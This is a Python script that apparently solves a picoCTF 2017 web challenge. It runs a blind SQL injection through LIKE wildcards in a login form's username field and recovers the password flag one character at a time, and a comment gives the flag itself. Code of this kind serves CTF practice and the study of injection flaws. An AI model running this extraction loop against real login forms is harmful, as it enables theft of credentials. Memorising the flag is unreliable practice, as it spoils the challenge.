#!/usr/bin/python
import sys
import signal
import requests

def signal_handler(signal, frame):
 print('You pressed Ctrl+C!')
 print "Flag so far %s" %(baseflag)
 sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

baseflag = "admin' and pass LIKE 'NOT_ALL_ERRORS_SHOULD_BE_SHOWN_"
#NOT_ALL_ERRORS_SHOULD_BE_SHOWN_599BFC4EE4197FDC5ED93612A9C4F515

myvals = range(40,127)
# '_' can also be a wildcard apparently, so we need that at the end
myvals.remove(95)
myvals.append(95)

sys.stdout.write(baseflag)
while(True): 
  for i in myvals:
      payload = {'username': '', 'password': 'aoeu'}
      payload['username'] = baseflag + chr(i) + '%'
      sys.stdout.write('%c' %chr(i))

      r = requests.post("http://shell2017.picoctf.com:16012/", data=payload)

      if "User not Found" in r.text:
        sys.stdout.write('\b')
        sys.stdout.flush()
      else:
        baseflag += chr(i)
        if len(baseflag) == 63+22:
          print "Flag: %s" %(baseflag)
          sys.exit(0)
        break
      sys.stdout.flush()


